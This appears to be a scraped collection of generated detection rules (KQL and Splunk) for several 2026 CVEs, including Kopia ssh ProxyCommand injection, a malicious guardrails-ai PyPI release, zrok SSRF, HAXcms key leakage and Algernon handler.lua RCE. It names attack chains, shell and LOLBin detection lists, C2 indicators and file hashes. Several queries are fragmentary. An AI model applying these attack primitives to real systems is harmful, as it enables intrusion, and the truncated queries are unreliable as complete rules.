// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-46339")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

[LLM] Kopia process spawns ssh with -oProxyCommand= argument (CVE-2026-45695) Exploitation High
Detects exploitation of Kopia's unauthenticated SFTP/externalSSH path injection. When the vulnerable /api/v1/repo/exists handler invokes blob.NewStorage with attacker-supplied sshArguments, the kopia process directly forks ssh with a -oProxyCommand= token that OpenSSH then executes via $SHELL -c. The kopia→ssh parent/child with ProxyCommand in the child argv is a near-zero-FP signature of this RCE. Rationale: Uses the exact narrow signature described in the advisory: kopia process (vulnerable handler) directly invoking exec.CommandContext("ssh", ...) with a ProxyCommand token. The string 'ProxyCommand' in an ssh argv whose parent is kopia has effectively no benign use case outside intentional SFTP jump-host setups. Cross-checked against the GHSA advisory, the Kopia v0.22.3 source references in the article, and the fix PR #5354. Cross-checked against: • https://github.com/kopia/kopia/pull/5354 • https://github.com/kopia/kopia/blob/v0.22.3/repo/blob/sftp/sftp_storage.go • https://nvd.nist.gov/vuln/detail/CVE-2026-45695
ATT&CKT1190 T1059.004 T1059.003

| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("kopia","kopia.exe","kopia-ui","kopia-ui.exe")
| where FileName in~ ("ssh","ssh.exe")
| where ProcessCommandLine has "ProxyCommand"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, FolderPath, ProcessCommandLine, ProcessId, InitiatingProcessId, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("kopia","kopia.exe","kopia-ui","kopia-ui.exe")
| where ActingProcessName has_any ("ssh","ssh.exe")
| where ActingProcessCommandLine has "ProxyCommand"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, ActingProcessId
| order by TimeGenerated desc

[LLM] SSH process spawned by Kopia invokes a shell child (ProxyCommand execution) Installation High
Detects the second-stage execution arm of CVE-2026-45695: OpenSSH evaluates -oProxyCommand=<cmd> by invoking $SHELL -c <cmd> before any TCP connect. The resulting kopia → ssh → (sh|bash|cmd|powershell) grand-parent/parent/child chain is the artifact of arbitrary code running as the kopia service account. Rationale: This is the exact execution chain the advisory describes — OpenSSH spawns $SHELL -c <attacker_cmd> before attempting TCP, so the shell child of ssh is the observable smoking gun. Pairing it with a kopia grand-parent (via SshPid join) removes essentially all benign ssh ProxyCommand use. Confirmed against the GHSA advisory text and OpenSSH ProxyCommand documented behaviour. Cross-checked against: • https://github.com/advisories/GHSA-2q4c-3mrw-63c3 • https://man.openbsd.org/ssh_config.5#ProxyCommand • https://github.com/kopia/kopia/pull/5354
ATT&CKT1059.004 T1059.001 T1059.003 T1203

    non-browser process touching these files is a high-fidelity signal.

            - '\Microsoft\Edge\User Data\'

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc") or SHA1 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc") or MD5 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc") or SHA1 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc") or MD5 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

      AND (Filesystem.file_path="*/tmp/managed.pyz*" OR Filesystem.file_path="*/var/run/docker.sock*" OR Filesystem.file_path="*/tmp/kubectl*" OR Filesystem.file_path="*/dev/null*" OR Filesystem.file_path="*/usr/bin/pgmonitor.py*" OR Filesystem.file_path="*/etc/timezone*" OR Filesystem.file_path="*/etc/localtime*" OR Filesystem.file_path="*/etc/systemd/system/pgsql-monitor.service*" OR Filesystem.file_name IN ("__init__.py","__main__.py","roulette.py","timeago.js"))
    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
       Filesystem.file_path, Filesystem.file_name
| `drop_dm_object_name(Filesystem)`
]

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Installation of malicious guardrails-ai==0.10.1 PyPI package (CVE-2026-45758)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Python process executing transformers.pyz dropped from git-tanstack.com (TeamPCP)
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] DNS lookup for git-tanstack.com TeamPCP C2 staging domain · [LLM] Outbound connection to TeamPCP C2 IP 83.142.209.194 · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] Installation of malicious guardrails-ai==0.10.1 PyPI package (CVE-2026-45758) Delivery High
Hunts pip/uv/poetry invocations that pin or resolve to the quarantined guardrails-ai 0.10.1 release. Any host that ran this install must be treated as compromised because the malicious code executes on package import, not just install. Rationale: Pivots on the exact malicious release pin string `guardrails-ai==0.10.1` named in the GHSA advisory. SafeDep + Qualys confirm the 0.10.1 PyPI artifact runs malicious code on import; any host that installed it is presumed compromised regardless of whether the dropper fired. Casing variations are covered for path matches. Cross-checked against: • https://github.com/guardrails-ai/guardrails/issues/1473 • https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/ • https://qualysec.com/cybersecurity-news/mini-shai-hulud-worm-compromises/ • https://www.ox.security/blog/shai-hulud-here-we-go-again-170-packages-hit-across-npm-pypi/

| where ProcessCommandLine has "guardrails-ai" or ProcessCommandLine has "guardrails_ai"

| where AccountName !endswith "$"

     or ParentProcessName has_any ("pip.exe","pip3.exe","uv.exe","poetry.exe")

[LLM] Python process executing transformers.pyz dropped from git-tanstack.com (TeamPCP) Installation High
Hunts the post-import dropper stage: a python interpreter invoked with the staged payload filename `transformers.pyz` or writing that file to disk. This is the second-stage execution from the malicious guardrails-ai 0.10.1 __init__.py and is shared with the broader TanStack/Mistral mini-Shai-Hulud campaign. Rationale: SafeDep + Qualys reverse-engineered the malicious `guardrails/__init__.py` and identified the exact dropper filename `transformers.pyz` pulled from git-tanstack.com and executed via python3. `.pyz` is a Python zipapp — a high-signal extension on a process command line because legitimate transformers (HuggingFace) ships as a wheel, not a zipapp. Cross-checked against: • https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/ • https://qualysec.com/cybersecurity-news/mini-shai-hulud-worm-compromises/ • https://www.ox.security/blog/shai-hulud-here-we-go-again-170-packages-hit-across-npm-pypi/

[LLM] DNS lookup for git-tanstack.com TeamPCP C2 staging domain Command & Control High
Detects any DNS query for the attacker-controlled domain git-tanstack.com used to host the transformers.pyz second-stage payload in the guardrails-ai 0.10.1 (CVE-2026-45758) and parallel TanStack/Mistral mini-Shai-Hulud campaign. Rationale: git-tanstack.com is the exact attacker domain identified by SafeDep, Qualys and Ox Security as the staging host for the TeamPCP campaign's transformers.pyz payload — the name typosquats the legitimate TanStack open-source org. Any successful resolution from inside the enterprise indicates either active compromise or sandbox detonation. Cross-checked against: • https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/ • https://qualysec.com/cybersecurity-news/mini-shai-hulud-worm-compromises/ • https://www.ox.security/blog/shai-hulud-here-we-go-again-170-packages-hit-across-npm-pypi/

[LLM] Outbound connection to TeamPCP C2 IP 83.142.209.194 Command & Control High
Detects any TCP/UDP connection to the attacker-controlled IP 83.142.209.194 hosting git-tanstack.com and the transformers.pyz dropper. Catches DNS-bypass / direct-IP fetches and proxy-tunnelled connections the DNS UC would miss. Rationale: 83.142.209.194 is the canonical IP for git-tanstack.com identified in the pre-extracted IOC bundle and confirmed by the SafeDep + Qualys writeups of the TeamPCP campaign. Direct-IP detection catches dropper variants that hard-code the IP to bypass DNS-based blocks. Cross-checked against: • https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/ • https://qualysec.com/cybersecurity-news/mini-shai-hulud-worm-compromises/

| order by Timestamp desc

—
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] zrok ProxyShare SSRF — request path begins with absolute URL (CVE-2026-45568)

Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] zrok ProxyShare SSRF — request path begins with absolute URL (CVE-2026-45568) Exploitation High
Hunts inbound HTTP requests to a zrok Python ProxyShare where the request path itself is an absolute URL (http:// or https://) — the precise shape of the CVE-2026-45568 SSRF, including pivots to cloud metadata services like 127.0.0.1:19190/metadata. Article-specific because Flask + urllib.parse.urljoin only rewrites the host when the second argument is absolute, so this URI shape is the exact attacker vector. Rationale: Article specifies the exact SSRF primitive: a request path that itself is an absolute URL (e.g. http://127.0.0.1:19190/metadata) bypasses urljoin's base-URL anchoring. The Sentinel union targets the two web-server log tables actually populated for App Service and IIS-hosted zrok deployments; the Defender query pivots on the resulting outbound proxy call to link-local / loopback metadata IPs since Defender doesn't expose web access logs. Cross-checked GHSA-jh67-hwqw-m5r7 and the urllib.parse.urljoin RFC-3986 absolute-URI behaviour documented at docs.python.org. Cross-checked against: • https://github.com/advisories/GHSA-jh67-hwqw-m5r7 • https://docs.python.org/3/library/urllib.parse.html#urllib.parse.urljoin • https://nvd.nist.gov/vuln/detail/CVE-2026-45568
ATT&CKT1190 T1090
Data sourcesWeb.Web
// Defender Advanced Hunting has no native web-server log table; this detection lives in IIS / AppService / WAF logs and is expressed on Sentinel side.
// Closest Defender pivot: any process on a zrok-hosting endpoint making an outbound connection to a link-local / loopback metadata IP shortly after receiving inbound traffic on the share.
let MetadataIPs = dynamic(["127.0.0.1","169.254.169.254","169.254.170.2","fd00:ec2::254","100.100.100.200"]);
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("zrok.exe","zrok","python.exe","python3","python","pythonw.exe")
   or InitiatingProcessCommandLine has_any ("zrok share","ProxyShare","zrok.proxy","urllib.parse.urljoin")
| where RemoteIP in (MetadataIPs) or RemoteIP startswith "169.254."
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine,
          RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessAccountName, ReportId
| order by Timestamp desc
// Hunt inbound HTTP requests where the URI itself is an absolute URL (the zrok ProxyShare SSRF shape).
let Lookback = 7d;
let AbsoluteUrlPath = @"(?i)^/+https?:/";
let MetadataMarkers = dynamic(["127.0.0.1","169.254.169.254","metadata.google","metadata.azure","100.100.100.200","/metadata","/latest/meta-data","/computeMetadata"]);
union isfuzzy=true
(
    W3CIISLog
    | where TimeGenerated > ago(Lookback)
    | where csUriStem matches regex AbsoluteUrlPath
         or csUriQuery has_any (MetadataMarkers)
    | project TimeGenerated, _ResourceId, Computer,
              ClientIP = cIP, Method = csMethod,
              UriStem = csUriStem, UriQuery = csUriQuery,
              Status = scStatus, UserAgent = csUserAgent,
              SourceTable = "W3CIISLog"
),
(
    AppServiceHTTPLogs
    | where TimeGenerated > ago(Lookback)
    | where CsUriStem matches regex AbsoluteUrlPath
         or CsUriQuery has_any (MetadataMarkers)
    | project TimeGenerated, _ResourceId, Computer = CsHost,
              ClientIP = CIp, Method = CsMethod,
              UriStem = CsUriStem, UriQuery = CsUriQuery,
              Status = ScStatus, UserAgent = UserAgent,
              SourceTable = "AppServiceHTTPLogs"
)
| extend AbsoluteUrlInPath = iff(UriStem matches regex AbsoluteUrlPath, true, false)
| extend MetadataTargeted = iff(UriStem has_any (MetadataMarkers) or UriQuery has_any (MetadataMarkers), true, false)
| where AbsoluteUrlInPath or MetadataTargeted
| order by TimeGenerated desc

[LLM] HAXcms CVE-2026-46395: unauthenticated GET to /system/api/connectionSettings Exploitation High
Surfaces any HTTP GET to the HAXcms unauthenticated /system/api/connectionSettings endpoint, which returns base64 tokens whose tail bytes are the private signing key (privateKey+salt) plaintext. A single GET against a vulnerable @haxtheweb/haxcms-nodejs <= 25.0.0 instance fully discloses the JWT-signing secret, so any request to this path on internet-facing HAXcms deployments warrants triage. Rationale: Endpoint path `/system/api/connectionSettings` is the article-named primary leak vector and is not present on benign HAXcms traffic that goes through the authenticated UI. A successful 2xx on this path is essentially equivalent to private-key exfiltration. Defender_kql is intentionally empty because Defender Advanced Hunting does not ship raw HTTP request URIs for arbitrary Node.js applications — the detection lives on the web tier (AppServiceHTTPLogs / W3CIISLog). Cross-checked against: • https://github.com/advisories/GHSA-6c8g-9hfh-pq5h • https://github.com/haxtheweb/issues
ATT&CKT1552.001 T1190
Data sourcesWeb.Web
let WindowDays = 7d;
let HaxcmsLeak = union isfuzzy=true
    (AppServiceHTTPLogs
        | where TimeGenerated > ago(WindowDays)
        | where csMethod =~ "GET"
        | where csUriStem =~ "/system/api/connectionSettings"
        | project TimeGenerated, SourceIp = CIp, Host = CsHost, UriStem = csUriStem, Method = csMethod, Status = ScStatus, UserAgent),
    (W3CIISLog
        | where TimeGenerated > ago(WindowDays)
        | where csMethod =~ "GET"
        | where csUriStem =~ "/system/api/connectionSettings"
        | project TimeGenerated, SourceIp = cIP, Host = sSiteName, UriStem = csUriStem, Method = csMethod, Status = scStatus, UserAgent = csUserAgent);
HaxcmsLeak
| where Status between (200 .. 299)   // 2xx = key successfully disclosed
| summarize Hits = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated),
            UserAgents = make_set(UserAgent, 10), Statuses = make_set(Status, 5)
            by SourceIp, Host
| order by FirstSeen desc

[LLM] HAXcms CVE-2026-46395: forged-JWT admin write within 30m of connectionSettings leak Actions on Objectives High
Correlates a successful GET to /system/api/connectionSettings (the private-key leak primitive) with subsequent authenticated HAXcms admin-write API calls from the same source IP within 30 minutes. Because forged JWTs are signed with the stolen privateKey+salt they produce no login events and look indistinguishable from the real admin to single-event detections — this temporal correlation is the cleanest way to catch the full exploit chain. Rationale: The article describes the complete exploit chain (extract key → forge admin JWT → call admin API) as feasible "with a single HTTP request" sequence, and explicitly warns the forged tokens "produce no login events in logs". Temporal correlation of the article-named leak path (`/system/api/connectionSettings`) with the article-named admin endpoints (saveOutline / saveManifest / saveNode / createSite / deleteSite / saveFile / saveUser / form_token) from the same source IP within a tight window is the only reliable host-agnostic signal. Defender_kql is a host-tier approximation that depends on the HAXcms server itself being enrolled in Defender for Endpoint; if it is not, leave the Defender field empty operationally and rely on the Sentinel / Splunk web-tier queries. Datadog/Falcon/Sigma left empty — single-shape Sigma cannot express the cross-event join, and Falcon FDR does not ship arbitrary Node.js HTTP request URIs. Cross-checked against: • https://github.com/advisories/GHSA-6c8g-9hfh-pq5h • https://nvd.nist.gov/vuln/detail/CVE-2026-46395
ATT&CKT1606.001 T1078 T1190
Data sourcesWeb.Web
// HAXcms is a Node.js web app — the JWT/Authorization header signal lives on the web tier (AppServiceHTTPLogs / W3CIISLog), not in DeviceProcessEvents.
// On hosts that run HAXcms AND are enrolled in Defender, this query approximates the post-exploit chain by joining
// outbound DNS lookups from the suspected attacker host to HAXcms domains with subsequent file modifications under
// HAXcms content roots performed by the local node.exe.
let WindowMinutes = 30m;
let HaxcmsHostHints = dynamic(["haxcms","haxtheweb"]);
let NetTouch = DeviceNetworkEvents
    | where Timestamp > ago(7d)
    | where RemoteUrl has_any (HaxcmsHostHints) or InitiatingProcessFileName =~ "node.exe"
    | where ActionType in ("ConnectionSuccess","ConnectionAttempt","HttpConnectionInspected")
    | project NetTime = Timestamp, DeviceId, DeviceName, RemoteUrl, RemoteIP,
              InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName;
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "node.exe"
| where FolderPath has_any ("\\haxcms\\","/haxcms/","\\_sites\\","/_sites/","site.json","manifest.json")
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| join kind=inner NetTouch on DeviceId
| where Timestamp between (NetTime .. NetTime + WindowMinutes)
| extend DelaySec = datetime_diff('second', Timestamp, NetTime)
| project NetTime, FileWriteTime = Timestamp, DelaySec, DeviceName, RemoteUrl, RemoteIP,
          FileName, FolderPath, InitiatingProcessAccountName,
          InitiatingProcessCommandLine
| order by NetTime desc
let WindowMinutes = 30m;
let WindowDays = 7d;
let HaxcmsLeak = union isfuzzy=true
    (AppServiceHTTPLogs
        | where TimeGenerated > ago(WindowDays)
        | where csMethod =~ "GET" and csUriStem =~ "/system/api/connectionSettings"
        | where ScStatus between (200 .. 299)
        | project LeakTime = TimeGenerated, SourceIp = CIp, Host = CsHost),
    (W3CIISLog
        | where TimeGenerated > ago(WindowDays)
        | where csMethod =~ "GET" and csUriStem =~ "/system/api/connectionSettings"
        | where scStatus between (200 .. 299)
        | project LeakTime = TimeGenerated, SourceIp = cIP, Host = sSiteName);
let HaxcmsAdminWrite = union isfuzzy=true
    (AppServiceHTTPLogs
        | where TimeGenerated > ago(WindowDays)
        | where csMethod in~ ("POST","PUT","DELETE","PATCH")
        | where csUriStem has_any ("/system/api/saveOutline","/system/api/saveManifest","/system/api/saveNode","/system/api/createSite","/system/api/deleteSite","/system/api/saveFile","/system/api/saveUser","/system/api/listFiles")
        | where ScStatus between (200 .. 299)
        | project WriteTime = TimeGenerated, SourceIp = CIp, Host = CsHost,
                  UriStem = csUriStem, Method = csMethod, UserAgent = UserAgent),
    (W3CIISLog
        | where TimeGenerated > ago(WindowDays)
        | where csMethod in~ ("POST","PUT","DELETE","PATCH")
        | where csUriStem has_any ("/system/api/saveOutline","/system/api/saveManifest","/system/api/saveNode","/system/api/createSite","/system/api/deleteSite","/system/api/saveFile","/system/api/saveUser","/system/api/listFiles")
        | where scStatus between (200 .. 299)
        | project WriteTime = TimeGenerated, SourceIp = cIP, Host = sSiteName,
                  UriStem = csUriStem, Method = csMethod, UserAgent = csUserAgent);
HaxcmsLeak
| join kind=inner HaxcmsAdminWrite on SourceIp, Host
| where WriteTime between (LeakTime .. LeakTime + WindowMinutes)
| extend DelaySec = datetime_diff('second', WriteTime, LeakTime)
| project LeakTime, WriteTime, DelaySec, SourceIp, Host, UriStem, Method, UserAgent
| order by LeakTime desc

[LLM] Algernon web server spawning shell child process (CVE-2026-45721 handler.lua RCE) Exploitation High
Detects the Algernon web server binary spawning /bin/sh, /bin/bash or cmd.exe — the exact primitive used by handler.lua's run3() / os.execute() / io.popen() when the parent-directory traversal bug loads attacker-controlled Lua. Algernon's normal request handling does not fork shells; this pattern is the live exploitation signature. Rationale: Anchored on the article's explicit exploitation primitive: run3() at engine/basic.go:142 calls exec.Command("sh", "-c", ...) via lua/run3/run3.go:23, plus the unsandboxed gopher-lua os.execute / io.popen exposed because lua/pool/pool.go:34 omits SkipOpenLibs. The parent-process pivot (algernon) plus a shell child is article-specific and not covered by generic 'web server spawns shell' rules without the algernon binary name. Cross-checked GitHub xyproto/algernon repository structure to confirm 'algernon' is the canonical binary name; no external NVD entry yet (fresh GHSA-xwcr-wm99-g9jc). Cross-checked against: • https://github.com/xyproto/algernon • https://github.com/advisories/GHSA-xwcr-wm99-g9jc
ATT&CKT1190 T1059.004 T1505.003
Data sourcesEndpoint.Processes
// CVE-2026-45721 — Algernon parent process spawning a shell. Stock Algernon never forks /bin/sh for request handling; this is the run3()/os.execute() primitive that handler.lua exposes.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "algernon"
   or InitiatingProcessFolderPath has "/algernon"
   or InitiatingProcessFileName matches regex @"(?i)^algernon(\.exe)?$"
| where FileName in~ ("sh","bash","dash","zsh","ash","cmd.exe","powershell.exe","pwsh.exe")
| where AccountName !endswith "$"
// classic exploit shape: sh -c <attacker payload> launched by web server
| extend ShellArgs = iff(ProcessCommandLine has_any ("-c ","/c ","-Command","-EncodedCommand"), "shell-with-inline-cmd", "interactive-or-script")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          ShellArgs, SHA256, ReportId
| order by Timestamp desc
// CVE-2026-45721 — Algernon spawning shell on the ASIM cross-vendor process schema. Catches Linux (auditd) + Windows (4688/Sysmon) feeds.
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName matches regex @"(?i)(^|/)algernon(\.exe)?$"
| where TargetProcessName matches regex @"(?i)(^|/)(sh|bash|dash|zsh|ash|cmd\.exe|powershell\.exe|pwsh\.exe)$"
| where ActorUsername !endswith "$"
| extend ShellWithInlineCmd = iff(TargetProcessCommandLine has_any ("-c ","/c ","-Command","-EncodedCommand"), true, false)
| project TimeGenerated, DvcHostname, ActorUsername,
          ParentCmd = ActingProcessCommandLine,
          ChildName = TargetProcessName,
          ChildCmd  = TargetProcessCommandLine,
          ShellWithInlineCmd, EventVendor, EventProduct
| order by TimeGenerated desc

[LLM] handler.lua dropped outside Algernon's configured web root (CVE-2026-45721 backdoor stage) Installation High
Algernon's vulnerable DirPage walks UP from the requested directory looking for handler.lua and executes the first match with full Lua/run3/httpclient privileges. This rule alerts on any process writing a file named handler.lua into a parent-of-webroot location (/, /srv, /var, /home, /tmp, /dev/shm) — the staging artefact that turns the bug into pre-auth RCE. Rationale: The article enumerates the exact candidate paths the vulnerable DirPage loop probes for each canonical Algernon invocation (/srv/handler.lua, /var/www/handler.lua, /home/<user>/handler.lua, /handler.lua, plus the /dev/shm extraction-dir variant from engine/handlers.go:249-266). A file write of handler.lua into ANY of those paths is the persistence artefact the bug weaponises — high specificity because legitimate Algernon deployments place handler.lua INSIDE the served tree (e.g. /srv/site/handler.lua), not in /srv/ or /var/. Cross-checked xyproto/algernon samples/ tree which confirms handler.lua only lives inside per-app subdirectories under samples/, never at samples/ root. Cross-checked against: • https://github.com/xyproto/algernon • https://github.com/advisories/GHSA-xwcr-wm99-g9jc

| where FileName =~ "handler.lua"
| extend FullPath = strcat(FolderPath, iff(FolderPath endswith "/" or FolderPath endswith "\\", "", "/"), FileName)
| where FullPath in~ (WebRootAncestors)
   or FolderPath matches regex @"^/home/[^/]+/?$"
   or FolderPath matches regex @"^/srv/?$"
   or FolderPath matches regex @"^/var(/www)?/?$"
   or FolderPath in~ ("/","/tmp","/dev/shm","/run","/opt","/usr/local")
| where InitiatingProcessAccountName !endswith "$"
// .alg archive extraction by algernon itself is a documented vector — keep but tag it
| extend ExtractedByAlgernon = iff(InitiatingProcessFileName =~ "algernon", true, false)
| project Timestamp, DeviceName, FullPath, FolderPath,
          WriterImage = InitiatingProcessFolderPath,
          WriterCmd   = InitiatingProcessCommandLine,
          WriterUser  = InitiatingProcessAccountName,
          ExtractedByAlgernon, SHA256, ReportId
| order by Timestamp desc
// CVE-2026-45721 — handler.lua dropped into a parent-of-webroot path. ASIM ImFileEvent covers Linux (auditd) + Windows (Sysmon EID 11) feeds.
let WebRootAncestors = dynamic([
    "/handler.lua",
    "/srv/handler.lua",
    "/var/handler.lua",
    "/var/www/handler.lua",
    "/home/handler.lua",
    "/tmp/handler.lua",
    "/dev/shm/handler.lua",
    "/opt/handler.lua",
    "/usr/local/handler.lua",
    "/run/handler.lua"
]);
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in ("FileCreated","FileModified","FileRenamed")
| where TargetFileName =~ "handler.lua"
| where TargetFilePath in~ (WebRootAncestors)
   or TargetFilePath matches regex @"^/home/[^/]+/handler\.lua$"
   or TargetFilePath matches regex @"^/var(/www)?/handler\.lua$"
| extend ExtractedByAlgernon = iff(ActingProcessName matches regex @"(?i)(^|/)algernon$", true, false)
| project TimeGenerated, DvcHostname, TargetFilePath,
          WriterCmd  = ActingProcessCommandLine,
          WriterName = ActingProcessName,
          WriterUser = ActorUsername,
          ExtractedByAlgernon, EventVendor, EventProduct
| order by TimeGenerated desc
title: handler.lua Written to Algernon Webroot Ancestor (CVE-2026-45721)
